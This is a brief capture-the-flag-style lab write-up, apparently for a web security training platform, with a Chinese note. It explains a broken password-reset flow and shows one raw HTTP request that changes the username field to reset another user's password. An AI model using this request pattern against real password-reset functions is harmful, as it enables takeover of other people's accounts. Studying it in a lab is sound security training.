# Lab: Password reset broken logic

This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page.

* Your credentials: wiener:peter
* Victim's username: carlos

## Authentication
* 稍微觀察一下可以發現 username 的地方改成 carlos 就可以改掉他的密碼了
```
POST /forgot-password?temp-forgot-password-token=amUyWbjJJOV676AjICG07G5ppUqCvJDD HTTP/1.1
Host: acf21f871e4e8ec8c0fd8a73005a0048.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5 (Ergänzendes Update)) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 113
Origin: https://acf21f871e4e8ec8c0fd8a73005a0048.web-security-academy.net
Connection: close
Referer: https://acf21f871e4e8ec8c0fd8a73005a0048.web-security-academy.net/forgot-password?temp-forgot-password-token=amUyWbjJJOV676AjICG07G5ppUqCvJDD
Cookie: session=tJHPtO9BEO4o6G6l6UJzJ1oNSsdecFM8
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-Forwarded-For: 127.0.0.1

temp-forgot-password-token=amUyWbjJJOV676AjICG07G5ppUqCvJDD&username=wiener&new-password-1=123&new-password-2=123
```